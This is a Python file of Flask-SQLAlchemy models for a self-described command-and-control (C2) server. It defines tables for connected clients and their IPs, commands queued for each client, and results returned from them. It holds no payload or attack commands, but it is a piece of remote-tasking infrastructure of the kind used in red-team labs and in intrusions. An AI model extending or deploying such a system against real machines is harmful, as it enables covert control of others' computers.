"""
Database models for C2 Server
"""

from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()


class Client(db.Model):
    """Client model - stores connected client information"""
    __tablename__ = 'clients'
    
    id = db.Column(db.String(255), primary_key=True)
    registered_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    ip = db.Column(db.String(45), nullable=False)  # IPv6 max length
    status = db.Column(db.String(50), default='active')
    
    # Relationships
    commands = db.relationship('Command', back_populates='client', cascade='all, delete-orphan')
    results = db.relationship('Result', back_populates='client', cascade='all, delete-orphan')
    
    def to_dict(self):
        """Convert client to dictionary"""
        return {
            'id': self.id,
            'registered_at': self.registered_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'ip': self.ip,
            'status': self.status
        }


class Command(db.Model):
    """Command model - stores pending commands for clients"""
    __tablename__ = 'commands'
    
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(255), db.ForeignKey('clients.id'), nullable=False)
    capability = db.Column(db.Integer, default=0, nullable=False)
    args = db.Column(db.Text, default='')
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    executed = db.Column(db.Boolean, default=False)
    
    # Relationships
    client = db.relationship('Client', back_populates='commands')
    
    def to_dict(self):
        """Convert command to dictionary"""
        return {
            'id': self.id,
            'client_id': self.client_id,
            'capability': self.capability,
            'args': self.args,
            'created_at': self.created_at.isoformat(),
            'executed': self.executed
        }


class Result(db.Model):
    """Result model - stores execution results from clients"""
    __tablename__ = 'results'
    
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(255), db.ForeignKey('clients.id'), nullable=False)
    capability = db.Column(db.Integer, nullable=False)
    result = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    ip = db.Column(db.String(45), nullable=False)
    
    # Relationships
    client = db.relationship('Client', back_populates='results')
    
    def to_dict(self):
        """Convert result to dictionary"""
        return {
            'id': self.id,
            'client': self.client_id,
            'capability': self.capability,
            'result': self.result,
            'timestamp': self.timestamp.isoformat(),
            'ip': self.ip
        }


def init_db(app):
    """Initialize database"""
    db.init_app(app)
    with app.app_context():
        db.create_all()
